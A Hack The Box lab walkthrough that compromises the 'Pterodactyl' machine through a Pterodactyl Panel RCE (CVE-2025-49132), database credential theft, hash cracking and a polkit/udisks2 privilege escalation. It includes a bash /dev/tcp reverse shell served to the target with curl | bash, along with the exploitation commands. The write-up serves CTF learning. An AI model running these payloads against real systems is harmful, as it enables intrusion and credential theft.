# Pterodactyl — Hack The Box Writeup
**Difficulty:** Medium | **OS:** Linux (openSUSE Leap 15.6)

---

## Table of Contents
1. [Enumeration](#1-enumeration)
2. [Subdomain Discovery](#2-subdomain-discovery)
3. [Information Disclosure via Changelog](#3-information-disclosure-via-changelog)
4. [CVE-2025-49132 — Pterodactyl RCE (Unauthenticated)](#4-cve-2025-49132--pterodactyl-rce-unauthenticated)
5. [Initial Foothold — Reverse Shell](#5-initial-foothold--reverse-shell)
6. [Internal Enumeration](#6-internal-enumeration)
7. [Database Access & Credential Extraction](#7-database-access--credential-extraction)
8. [Password Cracking & SSH Access](#8-password-cracking--ssh-access)
9. [User Flag](#9-user-flag)
10. [Privilege Escalation — CVE-2025-6018 & CVE-2025-6019](#10-privilege-escalation--cve-2025-6018--cve-2025-6019)
11. [Root Flag](#11-root-flag)
12. [Step-by-Step Summary](#12-step-by-step-summary)

---

## 1. Enumeration

Start with a standard Nmap service/version scan:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
80/tcp   open   http       nginx 1.21.5
443/tcp  closed https
8080/tcp closed http-proxy
```

The HTTP service on port 80 redirects to `http://pterodactyl.htb/`. Add the hostname to `/etc/hosts`:

```bash
echo "10.129.xx.xx  pterodactyl.htb" >> /etc/hosts
```

---

## 2. Subdomain Discovery

Use `ffuf` to fuzz for virtual hosts, filtering out the default redirect response (301, 3 words):

```bash
ffuf -u http://pterodactyl.htb \
     -H "Host: FUZZ.pterodactyl.htb" \
     -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fc 301 -fw 3
```

**Result:**

```
panel  [Status: 200, Size: 1897, Words: 490, Lines: 36]
```

Add `panel.pterodactyl.htb` to `/etc/hosts`:

```bash
echo "10.129.xx.xx  panel.pterodactyl.htb" >> /etc/hosts
```

---

## 3. Information Disclosure via Changelog

Checking for exposed files on the main domain reveals a changelog:

```bash
curl http://pterodactyl.htb/changelog.txt
```

**Key findings from `changelog.txt`:**

- The panel subdomain runs **Pterodactyl Panel v1.11.10**
- A `play.pterodactyl.htb` subdomain is also referenced
- **PHP-PEAR** is installed and enabled
- A `phpinfo()` debug endpoint was added temporarily
- The backend uses **MariaDB 11.8.3** and **PHP-FPM**

> The PHP-PEAR installation is significant — it becomes the code execution vector for the RCE exploit below.

---

## 4. CVE-2025-49132 — Pterodactyl RCE (Unauthenticated)

**Vulnerability:** Pterodactyl Panel versions prior to 1.11.11 are vulnerable to unauthenticated Remote Code Execution via the `/locales/locale.json` endpoint. The `locale` and `namespace` query parameters are passed unsanitised to PHP-PEAR's `include()` mechanism, allowing arbitrary file inclusion and ultimately command execution.

- **CVSSv3 Score:** 10.0 CRITICAL
- **Reference:** [https://github.com/rippxsec/CVE-2025-49132](https://github.com/rippxsec/CVE-2025-49132)

### 4.1 — Scanning for Vulnerability

```bash
python3 exploit.py -H http://panel.pterodactyl.htb/ --scan
```

**Output confirms the target is vulnerable and leaks sensitive data:**

```
[+] VULNERABLE - Database credentials leaked
    Host:     127.0.0.1
    Port:     3306
    Database: panel
    Username: pterodactyl
    Password: [REDACTED]

[+] VULNERABLE - App configuration leaked
    App Key: base64{{[REDACTED]}}
    App Name: Pterodactyl
    URL:      http://panel.pterodactyl.htb
```

---

## 5. Initial Foothold — Reverse Shell

### 5.1 — Drop into a pseudo-shell via the exploit

```bash
python3 exploit.py -H http://panel.pterodactyl.htb/ --shell
```

```
shell> id
uid=474(wwwrun) gid=477(www) groups=477(www)
```

### 5.2 — Upgrade to a full interactive reverse shell

Prepare a reverse shell script on the attacker machine:

```bash
# reverse.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1
```

Host it with a Python HTTP server and set up a listener with [Penelope](https://github.com/brightio/penelope):

```bash
# Attacker — listener
penelope -p 4444

# Attacker — serve the script
python3 -m http.server 80
```

Trigger the download and execution from the pseudo-shell:

```bash
shell> curl 10.10.xx.xx/reverse.sh | bash
```

Penelope upgrades the shell to a full PTY automatically:

```
[+] Got reverse shell from pterodactyl~10.129.xx.xx
[+] Shell upgraded successfully using /usr/bin/python3!
wwwrun@pterodactyl:/var/www/pterodactyl/public>
```

---

## 6. Internal Enumeration

Check listening services to understand the internal attack surface:

```bash
wwwrun@pterodactyl:/var/www/pterodactyl/public> ss -tulnp
```

**Notable listeners:**

| Port | Service |
|------|---------|
| 3306 | MariaDB (127.0.0.1) |
| 6379 | Redis (127.0.0.1) |
| 9000 | PHP-FPM (127.0.0.1) |
| 25   | SMTP (127.0.0.1) |
| 22   | SSH (0.0.0.0) |
| 80   | nginx (0.0.0.0) |

Check home directories for user accounts:

```bash
ls /home
# headmonitor  phileasfogg3
```

---

## 7. Database Access & Credential Extraction

Using the database credentials obtained via the CVE-2025-49132 scan, connect to MariaDB:

```bash
mysql -u pterodactyl -p -h 127.0.0.1 -P 3306
```

```sql
use panel;
select id, username, email, password, root_admin from users;
```

**Users table:**

| id | username | email | root_admin |
|----|----------|-------|------------|
| 2 | headmonitor | headmonitor@pterodactyl.htb | 1 |
| 3 | phileasfogg3 | phileasfogg3@pterodactyl.htb | 0 |

Both passwords are stored as bcrypt hashes (`$2y$10$...`). Save the hashes to a file for cracking.

---

## 8. Password Cracking & SSH Access

Use John the Ripper with the rockyou wordlist to crack the hashes:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

One hash is cracked successfully. Use the recovered credentials to log in over SSH:

```bash
ssh phileasfogg3@10.129.xx.xx
```

---

## 9. User Flag

```bash
phileasfogg3@pterodactyl:~> cat user.txt
[REDACTED]
```

---

## 10. Privilege Escalation — CVE-2025-6018 & CVE-2025-6019

The target OS is **openSUSE Leap 15.6**, which is affected by a chained privilege escalation:

### CVE-2025-6018 — PAM Misconfiguration (polkit bypass)
A misconfiguration in PAM on openSUSE Leap 15.6 causes remote SSH sessions to be classified as `Active` (i.e., `allow_active`) by polkit when certain `XDG_SEAT` / `XDG_VTNR` environment variables are set via `.pam_environment`.

### CVE-2025-6019 — libblockdev / udisks2 SUID Escalation
A flaw in `udisks2` / `libblockdev` allows a user with an `allow_active` polkit session to trigger an XFS filesystem resize operation on a loop-mounted image. This is abused to inject a SUID root shell binary into the image, which is then mounted and executed.

**PoC:** [https://github.com/MichaelVenturella/CVE-2025-6018-6019-PoC](https://github.com/MichaelVenturella/CVE-2025-6018-6019-PoC)

### 10.1 — Build the PoC on the attacker machine

```bash
./build_poc.sh
```

This compiles a static SUID shell (`rootbash`), creates an XFS image with it embedded, and compiles the `catcher` binary. Output files: `exploit.img` and `catcher`.

### 10.2 — Transfer files to the target

Upload `exploit.img` and `catcher` to `/tmp` on the target (e.g., via `scp` or `curl`).

### 10.3 — Set the PAM environment variables

Write the override variables to trigger the polkit bypass on the **next** SSH login:

```bash
phileasfogg3@pterodactyl:~> { echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > .pam_environment
phileasfogg3@pterodactyl:~> exit
```

### 10.4 — Re-authenticate and verify Active session

```bash
ssh phileasfogg3@10.129.xx.xx
```

```bash
phileasfogg3@pterodactyl:~> loginctl show-session $XDG_SESSION_ID | grep "Active=yes"
Active=yes
```

The session is now classified as active by polkit — the bypass is in effect.

### 10.5 — Run the exploit

```bash
phileasfogg3@pterodactyl:~> ./exploit.sh
```

```
[+] Session is Active. Polkit bypass enabled.
[*] Starting Background Trigger (Wait 2s)...
[*] Starting Foreground Catcher...
[*] HOLD TIGHT. ROOT SHELL INCOMING.
[*] Sniper started. Waiting for ANY loop mount...
[*] (BG) Setting up loop device...
[*] (BG) Triggering Resize on /org/freedesktop/UDisks2/block_devices/loop0...
[!!!] HIT! Mounted at: /tmp/blockdev.24LQR3
```

A root shell drops.

---

## 11. Root Flag

```bash
pterodactyl:~# cat /root/root.txt
[REDACTED]
```

---

## 12. Step-by-Step Summary

### Phase 1 — Reconnaissance
1. Run `nmap -sV -sC` against the target. Find ports 22 (SSH) and 80 (nginx). The HTTP server redirects to `pterodactyl.htb` — add it to `/etc/hosts`.
2. Use `ffuf` to enumerate virtual hosts. Discover the `panel` subdomain. Add `panel.pterodactyl.htb` to `/etc/hosts`.
3. Retrieve `http://pterodactyl.htb/changelog.txt`. This reveals the panel version (**Pterodactyl v1.11.10**), the presence of **PHP-PEAR**, and that a debug `phpinfo()` endpoint was temporarily enabled.

### Phase 2 — Initial Access via CVE-2025-49132
4. Use the public PoC for **CVE-2025-49132** in `--scan` mode. The exploit hits `/locales/locale.json` with crafted `locale` and `namespace` parameters. The panel leaks its `.env` file contents — exposing the **database credentials** and **application key**.
5. Rerun the PoC in `--shell` mode to get a pseudo web shell as `wwwrun`.
6. Serve a bash reverse shell script from the attacker machine, trigger it via `curl | bash` in the pseudo-shell, and catch the connection with **Penelope**, which auto-upgrades it to a PTY.

### Phase 3 — Lateral Movement to User
7. Run `ss -tulnp` to map internal services. MariaDB is listening on `127.0.0.1:3306`.
8. Connect to MariaDB using the credentials from step 4. Query the `panel.users` table and extract two bcrypt password hashes.
9. Save hashes to a file and crack them with **John the Ripper** + `rockyou.txt`. Recover the password for `phileasfogg3`.
10. SSH into the box as `phileasfogg3` and read `user.txt`.

### Phase 4 — Privilege Escalation to Root via CVE-2025-6018 + CVE-2025-6019
11. Identify the OS as **openSUSE Leap 15.6**, which is vulnerable to the chained CVE-2025-6018/6019 polkit bypass.
12. On the attacker machine, build the PoC (`build_poc.sh`). This produces a malicious XFS loop image (`exploit.img`) with a SUID root shell embedded, and a `catcher` binary.
13. Transfer `exploit.img` and `catcher` to `/tmp` on the target.
14. Write `XDG_SEAT` and `XDG_VTNR` override values to `~/.pam_environment` to trick PAM/polkit into treating the SSH session as a local active session. Log out.
15. Re-login over SSH. Verify the session is `Active=yes` via `loginctl`.
16. Run `exploit.sh`. The background thread mounts the loop image via `udisks2`; the foreground `catcher` races the mount event and executes the SUID shell before it is unmounted, yielding a root shell.
17. Read `/root/root.txt`.

---

### Key Vulnerabilities Chained

| Step | CVE / Technique | Impact |
|------|----------------|--------|
| RCE | CVE-2025-49132 | Unauthenticated RCE via PHP-PEAR in Pterodactyl ≤ 1.11.10 |
| DB leak | CVE-2025-49132 | `.env` exposure → DB credentials & app key |
| Lateral | Weak password | bcrypt hash cracked via rockyou |
| PrivEsc | CVE-2025-6018 | PAM misconfig → polkit `allow_active` bypass over SSH |
| PrivEsc | CVE-2025-6019 | udisks2 XFS resize race → SUID shell injection |
